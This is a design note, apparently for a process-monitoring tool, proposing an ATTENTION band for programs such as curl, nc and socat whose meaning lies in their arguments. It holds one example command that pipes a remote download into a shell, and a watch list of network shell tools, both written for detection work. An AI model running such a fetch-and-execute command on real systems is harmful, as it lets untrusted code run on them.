# Argument-bound programs

**[defined]** Implemented as the `ATTENTION` band; the trust of one exact
invocation is still open.

For some programs the name says nothing: what `curl` does is in
its arguments. `curl -s https://example.org/update.json` from a timer and
`curl -s http://198.51.100.7/x | sh` share one signature today.

## The rule

- A short list in `process/heuristics/attention.yaml` names them: `curl`, `wget`,
  `nc`, `ncat`, `socat`, `ssh`, `scp`, `rsync`, `base64`, `dd`, `openssl`,
  an interpreter given inline code (`python3 -c`, `perl -e`, `node -e`).
- **[defined]** It is a property of the program, not a trust level, the
  same way the provider is not trust.
- While one runs, it never fades: no annotation and no parent's `children`
  can make it `SAFE`. It shows with its whole command line.
- `sh -c curl …` inherits it: this closes the hole where a `-c` signature
  keeps only the first word (see [signature-spoofing.md](signature-spoofing.md)).
- In a [background trace](background-trace.md), every invocation is
  recorded with its full arguments.

## Where it shows

- **[question]** A band of its own between `WEIRD` and `NEW`, or `WEIRD`
  renamed to say "may be legitimate, needs a look"?
  - Its own band keeps `WEIRD` loud: a binary in `/tmp` should not sit next
    to a routine `curl`.
  - One renamed band keeps the screen simpler, but dilutes the strongest
    signals.
- **[question]** Its name says what it is (`TRANSIENT`) or what to do
  (`ATTENTION`)? `watch` is already a trust level.

## Trusting one invocation

- **[question]** Let the human trust an exact command line, keyed by name,
  executable and a hash of the arguments? A timer's fixed `curl` would then
  fade, and any other `curl` would not.
- **[caution]** Arguments can carry secrets (a token in a URL): store the
  hash, never the text, in a shared audit.
